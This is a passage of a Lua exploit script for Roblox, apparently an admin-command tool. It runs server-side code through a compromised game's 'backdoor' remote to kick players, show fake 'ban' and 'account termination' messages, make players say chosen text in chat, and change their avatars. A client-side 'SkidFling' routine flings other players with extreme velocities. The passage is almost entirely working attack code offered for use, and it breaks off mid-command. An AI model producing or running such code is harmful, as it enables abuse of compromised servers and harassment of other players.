			local updatedScript, _ = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					thawPlayer(localPlayer)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					thawPlayer(randomPlayer)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						thawPlayer(player)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					thawPlayer(player)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						thawPlayer(player)
						break
					end
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						local character = v.Character
						if character then
							local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
							if humanoidRootPart then
								humanoidRootPart.Anchored = false
								local humanoid = character:FindFirstChild("Humanoid")
								if humanoid then
									humanoid.PlatformStand = false
								end
							end
						end
					end
				end
			]], randomPlayer.Name)
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					local character = v.Character
					if character then
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if humanoidRootPart then
							humanoidRootPart.Anchored = false
							local humanoid = character:FindFirstChild("Humanoid")
							if humanoid then
								humanoid.PlatformStand = false
							end
						end
					end
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							local character = v.Character
							if character then
								local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
								if humanoidRootPart then
									humanoidRootPart.Anchored = false
									local humanoid = character:FindFirstChild("Humanoid")
									if humanoid then
										humanoid.PlatformStand = false
									end
								end
							end
						end
					end
				]], player.Name)
				break
			end
		end
	end

	executeThawScript(targetScript)
end)

-------------------------------------------------------------------------------------------------------------------------------

function fakeKick(player, reason)
	if player and player:IsA("Player") then
		if player.Character then
			player.Character:Destroy()
			player.Parent = nil
		end
		if reason then
			player:Kick(reason)
		else
			player:Kick()
		end
	end
end

addcommand("kick", "kick", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function executeKickScript(targetScript, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "kicked :<")
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakeKick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakeKick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakeKick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakeKick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakeKick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "kicked :<")
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "kicked :<") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "kicked :<")
				break
			end
		end
	end

	executeKickScript(targetScript, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("ban", "ban", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function executeKickScript(targetScript, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "banned :<")
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakeKick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakeKick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakeKick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakeKick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakeKick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "banned :<")
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "banned :<") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "banned :<")
				break
			end
		end
	end

	executeKickScript(targetScript, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("accountdelete", "terminate", function(target, reason)
	local players = game:GetService("Players"):GetPlayers()

	local function executeKickScript(targetScript, kickReason)
		if backdoor ~= nil then
			local updatedScript = string.gsub(targetScript, "%%username%%", game:GetService("Players").LocalPlayer.Name)
			updatedScript = string.gsub(updatedScript, "%%reason%%", kickReason or "what have you done")
			runRemote(backdoor, updatedScript)
		else
			if not target or target == "" or target == "me" then
				local localPlayer = game.Players.LocalPlayer
				if localPlayer then
					fakeKick(localPlayer, kickReason)
				end
			elseif target == "random" then
				local randomPlayer = players[math.random(1, #players)]
				if randomPlayer then
					fakeKick(randomPlayer, kickReason)
				end
			elseif target == "others" then
				local localPlayer = game.Players.LocalPlayer
				for _, player in ipairs(players) do
					if player ~= localPlayer then
						fakeKick(player, kickReason)
					end
				end
			elseif target == "all" then
				for _, player in ipairs(players) do
					fakeKick(player, kickReason)
				end
			else
				for _, player in ipairs(players) do
					if string.find(string.lower(player.Name), string.lower(target)) then
						fakeKick(player, kickReason)
						break
					end
				end
			end
		end
	end

	local targetScript
	if not target or target == "" or target == "me" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name == "%username%" then
					v:Kick("]] .. (reason or "what have you done") .. [[")
				end
			end
		]]
	elseif target == "random" then
		local randomPlayer = players[math.random(1, #players)]
		if randomPlayer then
			targetScript = string.format([[
				for i,v in pairs(game:GetService("Players"):GetChildren()) do 
					if v:IsA("Player") and v.Name == "%s" then
						v:Kick("%s")
					end
				end
			]], randomPlayer.Name, reason or "what have you done")
		end
	elseif target == "others" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") and v.Name ~= "%username%" then
					v:Kick("]] .. (reason or "what have you done") .. [[")
				end
			end
		]]
	elseif target == "all" then
		targetScript = [[
			for i,v in pairs(game:GetService("Players"):GetChildren()) do 
				if v:IsA("Player") then
					v:Kick("]] .. (reason or "what have you done") .. [[")
				end
			end
		]]
	else
		for _, player in ipairs(players) do
			if string.find(string.lower(player.Name), string.lower(target)) then
				targetScript = string.format([[
					for i,v in pairs(game:GetService("Players"):GetChildren()) do 
						if v:IsA("Player") and v.Name == "%s" then
							v:Kick("%s")
						end
					end
				]], player.Name, reason or "what have you done")
				break
			end
		end
	end

	executeKickScript(targetScript, reason)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("bodyfling", "bfling", function(target)
	local Players = game:GetService("Players")
	local localPlayer = Players.LocalPlayer

	local Targets = {target}
	local AllBool = false

	local function GetPlayer(Name)
		Name = Name:lower()
		if Name == "all" then
			AllBool = true
			return nil
		elseif Name == "random" then
			local GetPlayers = Players:GetPlayers()
			if table.find(GetPlayers, localPlayer) then 
				table.remove(GetPlayers, table.find(GetPlayers, localPlayer)) 
			end
			return GetPlayers[math.random(#GetPlayers)]
		else
			for _, x in ipairs(Players:GetPlayers()) do
				if x ~= localPlayer and x.Name:lower():match("^" .. Name) then
					return x
				end
			end
		end
		return nil
	end

	local function SkidFling(TargetPlayer)
		if not TargetPlayer or not TargetPlayer.Character then return end

		local Character = localPlayer.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart

		local TCharacter = TargetPlayer.Character
		local THumanoid = TCharacter and TCharacter:FindFirstChildOfClass("Humanoid")
		local TRootPart = THumanoid and THumanoid.RootPart
		local THead = TCharacter and TCharacter:FindFirstChild("Head")
		local Accessory = TCharacter and TCharacter:FindFirstChildOfClass("Accessory")
		local Handle = Accessory and Accessory:FindFirstChild("Handle")

		if not Character or not Humanoid or not RootPart then return end

		if RootPart.Velocity.Magnitude < 50 then
			getgenv().OldPos = RootPart.CFrame
		end

		if THead then
			workspace.CurrentCamera.CameraSubject = THead
		elseif Handle then
			workspace.CurrentCamera.CameraSubject = Handle
		elseif THumanoid and TRootPart then
			workspace.CurrentCamera.CameraSubject = THumanoid
		end

		local function FPos(BasePart, Pos, Ang)
			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
		end

		local function SFBasePart(BasePart)
			local TimeToWait = 2
			local StartTime = tick()
			local Angle = 0

			repeat
				if RootPart and THumanoid then
					Angle = Angle + 100
					FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
					task.wait()
				else
					break
				end
			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > StartTime + TimeToWait
		end

		local BV = Instance.new("BodyVelocity")
		BV.Name = "EpixVel"
		BV.Parent = RootPart
		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
		BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

		if TRootPart then
			SFBasePart(TRootPart)
		elseif THead then
			SFBasePart(THead)
		elseif Handle then
			SFBasePart(Handle)
		end

		BV:Destroy()
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		workspace.CurrentCamera.CameraSubject = Humanoid

		repeat
			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, 0.5, 0))
			Humanoid:ChangeState("GettingUp")
			for _, x in ipairs(Character:GetChildren()) do
				if x:IsA("BasePart") then
					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
				end
			end
			task.wait()
		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
	end

	local TargetPlayer = GetPlayer(target)

	if AllBool then
		for _, x in ipairs(Players:GetPlayers()) do
			if x ~= localPlayer then
				SkidFling(x)
			end
		end
	elseif TargetPlayer then
		SkidFling(TargetPlayer)
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("message", "message", function(...)
	text = table.concat({...}, " ")

	local function executeMessageScript(targetText)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub([[
                local message = Instance.new("Message")
                message.Text = "%message%"
		message.Name = "dontdeleteme"
                message.Parent = game:GetService("Workspace")
            ]], "%%message%%", targetText)
			runRemote(backdoor, updatedScript)
		else
			if targetText and targetText ~= "" then
				local message = Instance.new("Message")
				message.Text = targetText
				message.Parent = game:GetService("Workspace")
				message.Name "dontdeleteme"
			end
		end
	end

	executeMessageScript(text)
end)

addcommand("closemessages", "nomsgs", function()
	local function executeCloseMessagesScript()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") then
                        obj:Destroy()
                    end
                end
            ]]
			runRemote(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") then
					obj:Destroy()
				end
			end
		end
	end

	executeCloseMessagesScript()
end)

addcommand("closeunlabeledmessages", "noulmsgs", function()
	local function executeCloseMessagesScript()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") and obj.Name ~= "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runRemote(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") and obj.Name ~= "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	executeCloseMessagesScript()
end)

addcommand("closelabeledmessages", "nolmsgs", function()
	local function executeCloseMessagesScript()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Message") and obj.Name == "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runRemote(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Message") and obj.Name == "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	executeCloseMessagesScript()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("hint", "hint", function(...)
	text = table.concat({...}, " ")

	local function executeHintsScript(targetText)
		if backdoor ~= nil then
			local updatedScript, _ = string.gsub([[
                local message = Instance.new("Hint")
                message.Text = "%message%"
		message.Name = "dontdeleteme"
                message.Parent = game:GetService("Workspace")
            ]], "%%message%%", targetText)
			runRemote(backdoor, updatedScript)
		else
			if targetText and targetText ~= "" then
				local message = Instance.new("Hint")
				message.Text = targetText
				message.Parent = game:GetService("Workspace")
				message.Name = "dontdeleteme"
			end
		end
	end

	executeHintsScript(text)
end)

addcommand("closehints", "nohints", function()
	local function executeCloseHintsScript()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") then
                        obj:Destroy()
                    end
                end
            ]]
			runRemote(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") then
					obj:Destroy()
				end
			end
		end
	end

	executeCloseHintsScript()
end)

addcommand("closeunlabeledhints", "noulhints", function()
	local function executeCloseHintsScript()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") and obj.Name ~= "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runRemote(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") and obj.Name ~= "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	executeCloseHintsScript()
end)

addcommand("closelabeledhints", "nolhints", function()
	local function executeCloseHintsScript()
		if backdoor ~= nil then
			local updatedScript = [[
                for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
                    if obj:IsA("Hint") and obj.Name == "dontdeleteme" then
                        obj:Destroy()
                    end
                end
            ]]
			runRemote(backdoor, updatedScript)
		else
			for _, obj in pairs(game:GetService("Workspace"):GetChildren()) do
				if obj:IsA("Hint") and obj.Name == "dontdeleteme" then
					obj:Destroy()
				end
			end
		end
	end

	executeCloseHintsScript()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("chat", "talk", function(target, ...)
	text = table.concat({...}, " ")
	local ChatService = game:GetService("Chat")
	local Players = game:GetService("Players")

	local function bubbleTalk(player)
		if player.Character and player.Character:FindFirstChild("Head") then
			ChatService:Chat(player.Character.Head, text, Enum.ChatColor.White)
		end
	end

	if not backdoor then
		local targets = {}

		if not target or target == "" or target == "me" then
			table.insert(targets, Players.LocalPlayer)
		elseif target == "random" then
			local all = Players:GetPlayers()
			if #all > 0 then
				table.insert(targets, all[math.random(1, #all)])
			end
		elseif target == "others" then
			for _, p in ipairs(Players:GetPlayers()) do
				if p ~= Players.LocalPlayer then
					table.insert(targets, p)
				end
			end
		elseif target == "all" then
			targets = Players:GetPlayers()
		else
			for _, p in ipairs(Players:GetPlayers()) do
				if string.find(string.lower(p.Name), string.lower(target)) then
					table.insert(targets, p)
				end
			end
		end

		for _, p in ipairs(targets) do
			bubbleTalk(p)
		end
	else
		local targetScript = nil
		local escapedText = text:gsub("\\", "\\\\"):gsub('"', '\\"')

		if target == "me" then
			targetScript = string.format([[
				local p = game:GetService("Players"):FindFirstChild("%%username%%")
				if p and p.Character and p.Character:FindFirstChild("Head") then
					game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
				end
			]], escapedText)
		elseif target == "random" then
			targetScript = string.format([[
				local plrs = game:GetService("Players"):GetPlayers()
				if #plrs > 0 then
					local p = plrs[math.random(1, #plrs)]
					if p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], escapedText)
		elseif target == "others" then
			targetScript = string.format([[
				for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
					if p.Name ~= "%%username%%" and p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], escapedText)
		elseif target == "all" then
			targetScript = string.format([[
				for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
					if p.Character and p.Character:FindFirstChild("Head") then
						game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
					end
				end
			]], escapedText)
		else
			local matchedNames = {}
			for _, p in ipairs(Players:GetPlayers()) do
				if string.find(string.lower(p.Name), string.lower(target)) then
					table.insert(matchedNames, string.format('"%s"', p.Name))
				end
			end

			if #matchedNames > 0 then
				targetScript = string.format([[
					local names = {%s}
					for _, name in ipairs(names) do
						local p = game:GetService("Players"):FindFirstChild(name)
						if p and p.Character and p.Character:FindFirstChild("Head") then
							game:GetService("Chat"):Chat(p.Character.Head, "%s", Enum.ChatColor.White)
						end
					end
				]], table.concat(matchedNames, ", "), escapedText)
			end
		end

		if targetScript then
			targetScript = targetScript:gsub("%%username%%", Players.LocalPlayer.Name)
			runRemote(backdoor, targetScript)
		end
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("disco", "disco", function()
	if not isDiscoActive then
		savelighting()
		isDiscoActive = true
		task.spawn(startDiscoMode)
	end
end)

addcommand("undisco", "undisco", function()
	if isDiscoActive then
		isDiscoActive = false
	end
	loadlghting()
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("chickenarms", "carms", function(target)
	local players = game:GetService("Players"):GetPlayers()
	local localPlayer = game:GetService("Players").LocalPlayer

	function applyHeadslide(player)
		local character = player.Character
		if character and character:FindFirstChild("Torso") then
			local torso = character.Torso
			if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
				local leftShoulder = torso["Left Shoulder"]
				local rightShoulder = torso["Right Shoulder"]

				leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
					* CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
					* CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
				leftShoulder.C1 = CFrame.new(0, 0.5, 0)

				rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
					* CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
					* CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
				rightShoulder.C1 = CFrame.new(0, 0.5, 0)
			end
		end
	end

	local function executeChickenArmsScript(targetPlayer)
		local targetScript = ""

		if not target or target == "" or target == "me" then
			targetScript = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name == "%s" then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]], targetPlayer.Name)
		elseif target == "random" then
			local randomPlayer = players[math.random(1, #players)]
			if randomPlayer then
				targetScript = string.format([[
                    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                        if v:IsA("Player") and v.Name == "%s" then
                            local character = v.Character
                            if character then
                                local torso = character.Torso
                                if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                    local leftShoulder = torso["Left Shoulder"]
                                    local rightShoulder = torso["Right Shoulder"]

                                    leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                        * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                    leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                    rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                        * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                        * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                    rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                                end
                            end
                        end
                    end
                ]], randomPlayer.Name)
			end
		elseif target == "others" then
			targetScript = string.format([[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") and v.Name ~= "%s" then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]], targetPlayer.Name)
		elseif target == "all" then
			targetScript = [[
                for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                    if v:IsA("Player") then
                        local character = v.Character
                        if character then
                            local torso = character.Torso
                            if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                local leftShoulder = torso["Left Shoulder"]
                                local rightShoulder = torso["Right Shoulder"]

                                leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                    * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                    * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                            end
                        end
                    end
                end
            ]]
		else
			for _, player in ipairs(players) do
				if string.find(string.lower(player.Name), string.lower(target)) then
					targetScript = string.format([[
                        for i,v in pairs(game:GetService("Players"):GetChildren()) do 
                            if v:IsA("Player") and v.Name == "%s" then
                                local character = v.Character
                                if character then
                                    local torso = character.Torso
                                    if torso:FindFirstChild("Left Shoulder") and torso:FindFirstChild("Right Shoulder") then
                                        local leftShoulder = torso["Left Shoulder"]
                                        local rightShoulder = torso["Right Shoulder"]

                                        leftShoulder.C0 = CFrame.new(-1.5, 0.5, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, math.pi / 2, 0) 
                                            * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                        leftShoulder.C1 = CFrame.new(0, 0.5, 0)

                                        rightShoulder.C0 = CFrame.new(1.5, 0.5, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0) 
                                            * CFrame.fromEulerAnglesXYZ(math.pi / 2, 0, 0) 
                                            * CFrame.fromEulerAnglesXYZ(0, -math.pi / 2, 0)
                                        rightShoulder.C1 = CFrame.new(0, 0.5, 0)
                                    end
                                end
                            end
                        end
                    ]], player.Name)
					break
				end
			end
		end

		if backdoor then
			runRemote(backdoor, targetScript)
		else
			applyHeadslide(targetPlayer)
		end
	end

	executeChickenArmsScript(localPlayer)
end)

-------------------------------------------------------------------------------------------------------------------------------

addcommand("discoavatar", "davi", function(target)
	local presets = {"Bright red", "Bright yellow", "Bright orange", "Bright violet", "Bright blue", "Bright bluish green", "Bright green"}

	function applyDiscoAvatar(player)
		if player and player.Character then
			task.spawn(function()
				while true do
					task.wait(0.5)
					local characterParts = player.Character:GetChildren()
					for _, part in ipairs(characterParts) do
						if part:IsA("BasePart") then
							part.BrickColor = BrickColor.new(presets[math.random(1, #presets)])
						end
					end
				end
			end)
		end
	end

	local players = game:GetService("Players"):GetPlayers()

	if not target or target == "" or target == "me" then
